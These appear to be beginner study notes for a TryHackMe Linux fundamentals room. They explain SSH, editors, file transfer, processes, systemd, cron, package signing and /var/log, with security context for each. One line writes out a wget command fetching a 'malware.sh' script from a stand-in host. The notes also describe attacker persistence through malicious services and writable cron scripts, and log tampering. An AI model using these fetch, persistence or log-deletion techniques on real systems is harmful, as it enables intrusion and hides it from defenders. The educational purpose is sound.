Welcome to **Linux Fundamentals Part 3**! This is where you cross the line from just "typing commands" into actual system administration and security operations.

In previous rooms, you learned how to walk around the file system. In this room, you are learning how to build, control, and secure the environment itself. These concepts—SSH, processes, services, and logs—are the exact same tools that SOC analysts use to hunt hackers, and that hackers use to hide their tracks.

Let's break down your notes step-by-step, explain the terminology, and connect everything to real-world cybersecurity.

---

## 1. Remote Access: The Secure Shell (SSH)

### What it is

SSH stands for **Secure Shell**. It is a network protocol that gives you a secure, encrypted command-line interface on another computer over an unsecured network (like the internet).

### How it works internally

When you run `ssh username@IP_ADDRESS`, a client-server architecture kicks in. The remote machine is running a background service called the **SSH Daemon (`sshd`)**.

1. Your computer (the client) knocks on the remote machine's door (usually Port 22).
2. The server responds with its public fingerprint (which is why you see the "Do you want to trust this host?" prompt the first time you connect).
3. Once you accept, all traffic between your keyboard and the remote server is encrypted using cryptographic keys. Even if someone intercepts the Wi-Fi traffic, they only see random gibberish, not your passwords or commands.

<img width="2048" height="1639" alt="image" src="https://github.com/user-attachments/assets/087499f7-d5eb-4252-b03c-a856240153f1" />


### Cybersecurity Context

* **Penetration Testers:** After finding a vulnerability, hackers try to steal SSH keys or passwords to gain a "shell" on the machine. It is the holy grail of remote access.
* **SOC Analysts:** Defenders monitor SSH logs heavily. If they see 500 failed SSH login attempts from an IP in another country followed by 1 successful login, that is a massive red flag for a "Brute Force" attack.

---

## 2. Text Editors: Nano vs. Vim

### Why they matter

In the real world, Linux servers rarely have a Graphical User Interface (GUI) like Windows. You can't just open Notepad with your mouse. If you need to edit a configuration file, write a script, or change permissions, you *must* do it from the terminal.

* **Nano:** The beginner's best friend. The shortcuts (like `Ctrl+O` to write out/save, and `Ctrl+X` to exit) are printed directly on the screen. It is simple, but slow for massive files.
* **Vim (Vi IMproved):** A highly advanced editor where you navigate using keyboard commands instead of a mouse. It has a steep learning curve, but mastering it makes you incredibly fast.

> **Common Beginner Mistake:** Getting trapped in Vim. If you ever open Vim by accident and can't figure out how to close it, press `Esc`, type `:q!`, and hit `Enter`.

---

## 3. Data Transfer: Wget, SCP, and Python Servers

When you compromise a machine (or when you are setting one up), you need a way to move files in and out.

### Wget

* **What it is:** A tool to download files from the web directly to your terminal.
* **Command:** `wget [http://example.com/malware.sh](http://example.com/malware.sh)`
* **Offensive Use:** Attackers use `wget` to pull their malicious scripts from their own servers onto the victim's machine.

### Secure Copy (SCP)

* **What it is:** A file transfer tool that uses the SSH protocol. It securely copies files between two Linux machines.
* **Command:** `scp localfile.txt user@IP:/destination/`
* **Why it exists:** Unlike `wget`, which pulls from public web servers, `SCP` pushes/pulls directly into secure user directories using your SSH credentials.

### Python HTTP Server

* **Command:** `python3 -m http.server 8000`
* **What it does:** It turns your current folder into a mini web server. Anyone on the network can open a browser, type your IP and port, and download the files in that folder.
* **CTF / Pentest Use:** If an attacker needs to transfer a hacking tool to a compromised server, they will start a Python server on their own attack machine, and use `wget` on the compromised machine to download it.

---

## 4. Processes and the Process Tree

### What is a Process?

Every program running on Linux is a process. When you open Nano, that's a process. When SSH is running in the background, that's a process.

### Process IDs (PID)

Linux assigns a unique number to every process called a **PID**. When the system boots, the very first process it starts is PID 1 (usually `systemd`). Every other process branches out from there, creating a "Process Tree."

<img width="2048" height="1152" alt="image" src="https://github.com/user-attachments/assets/4212d632-d725-448a-9855-494c01de5ba7" />


### Key Commands

* `ps aux`: Shows *every* process running on the system, who owns it, and how much CPU/RAM it is using.
* `top`: The command-line equivalent of Windows Task Manager. It updates in real-time.
* `kill <PID>`: Sends a signal to stop a process.

> **Security Context:** Attackers often try to hide their malware by giving it a fake name (like naming their crypto-miner `apache2`). Threat hunters look at the `ps aux` output to find processes behaving strangely (e.g., a web server using 99% of the CPU).

---

## 5. Foreground, Background, and systemd

### Foreground vs. Background (`&`, `fg`, `Ctrl+Z`)

When you run a command, it locks up your terminal until it finishes (Foreground). If you add an ampersand (`&`) to the end of a command, Linux runs it silently in the Background, giving you your terminal back immediately.

* **Ctrl+Z:** Suspends (pauses) a running foreground process.
* **fg:** Brings a background or paused process back to the foreground.

### systemd and `systemctl`

`systemd` is the master manager of Linux. It controls "services" (programs designed to run continuously in the background, like web servers or SSH).

* `systemctl start ssh`: Turns the service on right now.
* `systemctl enable ssh`: Tells Linux, "Turn this on automatically every time the computer boots up."

> **Persistence:** Hackers love `systemctl enable`. If they compromise a machine, they will create a malicious service and *enable* it so that even if the administrator reboots the server, the hacker's backdoor starts up automatically.

---

## 6. Automation: Cron Jobs

### What is Cron?

Cron is a time-based job scheduler. It allows you to run scripts automatically at specific intervals (every minute, every day at 3 AM, every Sunday).

You edit your schedule using `crontab -e`. The syntax looks like five stars followed by a command:
`* * * * * /path/to/script.sh`

<img width="421" height="237" alt="image" src="https://github.com/user-attachments/assets/4f7d7077-91ee-4675-9dd1-665172d36db3" />


### Cybersecurity Context

Cron is heavily tested in TryHackMe and CTFs. If a penetration tester finds that a server is running a script every 5 minutes as the "root" (admin) user, and the tester has permission to edit that script, they can inject malicious commands into it. When Cron runs the script 5 minutes later, the attacker gets root access.

---

## 7. Package Management and GPG Keys

### APT (Advanced Package Tool)

In Windows, you go to a website, download an `.exe`, and run it. In Linux, software is stored in massive, centralized servers called **Repositories**.

* `apt update`: Downloads the latest "menu" of available software from the repository.
* `apt install nmap`: Finds the software on the menu, downloads it, and installs it automatically.

### GPG Keys

How does Linux know the software in the repository hasn't been tampered with by a hacker? **GPG (GNU Privacy Guard) Keys**.
When a developer writes software, they sign it with a cryptographic lock. Your Linux machine holds the matching key. If a hacker alters the software during download, the signature breaks, and `apt` will refuse to install it.

---

## 8. The Goldmine: `/var/log`

### What it is

Linux records everything that happens in log files, and almost all of them live in the `/var/log` directory.

### Key Log Files for Security:

* `/var/log/auth.log` (Debian/Ubuntu): Records every successful and failed login attempt (SSH, sudo usage).
* `/var/log/syslog`: General system messages.
* `/var/log/apache2/access.log`: If running a web server, this logs every single IP address that visits the site.

> **Incident Response:** When a company is hacked, the Incident Response (IR) team immediately grabs the contents of `/var/log`. However, smart attackers know this, and their final step before leaving a compromised machine is often trying to delete or alter these logs to cover their tracks.

---
